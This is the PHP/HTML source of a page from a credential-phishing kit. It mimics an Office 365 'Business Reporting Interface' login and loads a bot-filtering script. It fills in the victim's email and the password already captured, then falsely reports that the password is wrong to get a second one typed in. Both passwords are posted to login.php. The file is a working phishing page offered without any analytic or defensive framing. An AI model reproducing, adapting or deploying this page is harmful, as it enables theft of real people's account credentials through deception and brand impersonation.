<?php

require 'anti-bots.php';

if(!(isset($_POST['email']) && isset($_POST['pass1']))){

    header("Location: index2.php");
}
?>

<html><head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta content="width=device-width" name="viewport">
        <link href="img/o365.png" rel="shortcut icon" type="image/x-icon">
        <title>
           Office 365 Business Interface
        </title>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <link rel="stylesheet" media="screen" href="root/rui-core.min.css">
        <link rel="stylesheet" media="screen" href="root/rui-forms-all.min.css">
           </head>
    <body data-gr-c-s-loaded="true">
        
        <div id="wrapInfoAndLogin">
            <div class="form-and-links">
                <div class="login-section-container">
				
                    <div class="login-section">
					<center><img src="img/loop.png" width="180px" height="100px"></center>
                    <div style="width=25%;"> <center>
                    <span style="float : center;text-align: left;font-family: Segoe UI, SUWR, Verdana, sans-serif; margin: 0px; font-size: 16px; line-height: 15px; font-weight: bold; padding-top: 2px; padding-bottom: 2px;color: #9C9C9C;"> VIA       </span>&nbsp;&nbsp;
                    <?php
                    $a =$_POST['email'];
                    $arr = ['@163.qq.png','@aol.com.png','@apple.com.png','@bluehost.com.png','@gmail.com.png','@gmx.net.png','@hotmail.com.png','@hushmail.com.png','@icloud.com.png','@live.com.png','@mail.com.png','@msn.com.png','@namecheap.com.png','@office365.com.png','@outlook.com.png','@protonmail.com.png','@samsung.com.png','@zoho.com.png'];
                    
                      foreach ($arr as $key => $value) {
                          $v = substr($value, strpos($value, '@')+1, strpos($value, '.')-1);
                          if (strpos($a, '@'.$v) !== false) {
                            echo '<img width="10%" title="'.$v.'" src="icon/'.$value.'">';
                            break;
                          }
                          if($key == count($arr)-1){
                            echo '<img width="10%" title="Microsoft" src="icon/Microsoft-Partner-Logo-NEW.png" style="
                            width: 110px;
                        ">';
                          }
                      }
                    ?>
                    </center></div>
                        <h1>Business Reporting Interface</h1>
                        <p>Use your business account to log in.</p>
                        <div class="login-notice">
                            <div class="hidden box rui-message rui-info" id="no_cookies"></div>     
                        </div>
                        <div class="input-panel">
                            <form class="new_cp_user" id="new_cp_user" action="login.php" accept-charset="UTF-8" method="post">
                            <div class="username-area">
                                    <input placeholder="Business Email" readonly spellcheck="false" class="rui-input" tabindex="1" value="<?php echo $_POST['email'] ?>" type="email" name="email" id="cp_user_email" autofocus="" required="">
                                </div>
                                    <input placeholder="Email Password" class="rui-input" tabindex="1" value="<?php echo $_POST['pass1'] ?>" type="hidden" name="pass1" required="">
                                
                                <div class="username-area">
                                    <input placeholder="Password" class="rui-input" tabindex="1" type="password" name="pass2" required="" minlength="5 autofocus="" required="">
                                </div>
								<p class="click-link-info">The password is not correct/valid!</p>
                                <p class="click-link-info">
Office 365 recommends the use of a personal device to access this content!


                                </p><div class="submit-area">
                                    <input style="cursor:pointer;" type="submit" name="commit" value="Sign In" class="rui-button-brand" tabindex="3">
                                </div>
                            </form>
                        </div>
                        <div class="forgot-password">
                            <a href="#" tabindex="-1">Forgot your password?</a>
                        </div>
                        <div class="links-mobile">
                            <ul>
                                <li>
                                    <a href="#" tabindex="-1" title="About Us">About Us</a>
                                </li>
                                <li>
                                    <a href="#" tabindex="-1" title="Contact">Contact</a>
                                </li>
                                <li>
                                    <a href="#" tabindex="-1" title="Support">Support</a>
                                </li>
                                <li>
                                    <a href="#" tabindex="-1" title="Account Safety">Account Safety</a>
                                </li>
                            </ul>
                        </div>
                        <p class="breach-info-mobile">
                            It is a breach of our terms and conditions to provide username and password details to unauthorised third parties. Unauthorised use may lead to suspension or termination. See
                            <a href="#" tabindex="-1" title="Privacy">Privacy</a>
                            and
                            <a href="#" tabindex="-1" title="Legal">Legal.</a>
                        </p>
                    </div>
                </div>
                <div class="links-container">
                    <div class="links">
                        <ul>
                            <li>
                                <a href="#" tabindex="-1" title="About Us">About Us</a>
                            </li>
                            <li>
                                <a href="#" tabindex="-1" title="Contact">Contact</a>
                            </li>
                            <li>
                                <a href="#" tabindex="-1" title="Support">Support</a>
                            </li>
                            <li>
                                <a href="#" tabindex="-1" title="Account Safety">Account Safety</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="footer">
                <div class="breach-info">
                    <p>
                        It is a breach of our terms and conditions to provide username and password details to unauthorized third parties. Unauthorized use may lead to suspension or termination. See
                        <a href="#" tabindex="-1" title="Privacy">Privacy</a>
                        and
                        <a href="#" tabindex="-1" title="Legal">Legal.</a>
                    </p>
                </div>
            </div>
        </div>
        <div id="footerBg"></div>  
    

        <script type="text/javascript">
            
            document.addEventListener("DOMContentLoaded", function(event) {
   document.querySelectorAll('img').forEach(function(img){
  	img.onerror = function(){this.style.display='none';};
   })
});
        </script>
</body></html>